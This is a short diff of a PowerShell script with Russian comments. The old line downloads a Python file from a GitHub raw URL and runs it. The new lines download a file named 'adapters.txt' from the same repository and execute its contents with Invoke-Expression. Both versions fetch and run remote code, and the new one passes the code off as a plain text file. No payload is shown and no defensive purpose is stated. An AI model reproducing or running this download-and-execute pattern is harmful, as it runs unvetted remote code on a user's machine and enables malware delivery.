@@ -1,1 +1,5 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Desezutt/pupupu/main/pyp.py" -OutFile "pyp.py"; python pyp.py
+# Скачиваем adapters.txt
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Desezutt/pupupu/main/adapters.txt" -OutFile "adapters.txt"
+
+# Запускаем команды из adapters.txt
+Invoke-Expression (Get-Content -Path "adapters.txt" -Raw)
